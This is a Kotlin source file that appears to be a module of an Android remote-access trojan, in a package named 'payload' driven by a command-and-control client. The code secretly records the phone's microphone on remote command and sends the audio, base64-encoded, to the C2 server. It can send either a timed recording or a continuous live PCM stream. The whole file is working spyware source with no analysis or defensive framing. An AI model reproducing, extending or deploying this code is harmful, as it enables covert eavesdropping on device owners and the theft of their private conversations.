package com.ihk909.payload.modules

import android.content.Context
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Handler
import android.os.Looper
import android.util.Base64
import com.ihk909.payload.C2Client
import org.json.JSONObject
import java.io.File

object AudioModule {
    @Volatile private var live = false
    private var liveThread: Thread? = null

    fun record(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        runCatching {
            val ms = args.optInt("ms", 5000)
            val out = File(ctx.cacheDir, "aud_${System.currentTimeMillis()}.m4a")
            val r = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setOutputFile(out.absolutePath)
                prepare(); start()
            }
            Handler(Looper.getMainLooper()).postDelayed({
                runCatching {
                    r.stop(); r.release()
                    val b = out.readBytes()
                    c2.reply(id, JSONObject().put("m4a_b64", Base64.encodeToString(b, Base64.NO_WRAP)))
                    out.delete()
                }.onFailure { c2.replyError(id, it.message ?: "error") }
            }, ms.toLong())
        }.onFailure { c2.replyError(id, it.message ?: "error") }
    }

    fun startLive(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        if (live) { c2.reply(id, JSONObject().put("already", true)); return }
        runCatching {
            live = true
            val rate = 16000
            val minBuf = AudioRecord.getMinBufferSize(rate,
                AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT)
            val bufSize = minBuf.coerceAtLeast(4096)

            liveThread = Thread {
                var ar: AudioRecord? = null
                try {
                    ar = AudioRecord(MediaRecorder.AudioSource.MIC, rate,
                        AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, bufSize)
                    ar.startRecording()
                    val buf = ByteArray(bufSize)
                    while (live) {
                        val n = ar.read(buf, 0, buf.size)
                        if (n > 0) {
                            val chunk = buf.copyOf(n)
                            runCatching {
                                c2.event("audio_chunk", JSONObject()
                                    .put("pcm_b64", Base64.encodeToString(chunk, Base64.NO_WRAP))
                                    .put("rate", rate)
                                    .put("ts", System.currentTimeMillis()))
                            }
                        }
                    }
                } catch (_: Exception) {
                } finally {
                    ar?.let {
                        runCatching { it.stop(); it.release() }
                    }
                }
            }.apply { start() }
            c2.reply(id, JSONObject().put("started", true).put("rate", rate))
        }.onFailure { c2.replyError(id, it.message ?: "error") }
    }

    fun stopLive(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        live = false
        runCatching { liveThread?.join(1000) }
        c2.reply(id, JSONObject().put("stopped", true))
    }
}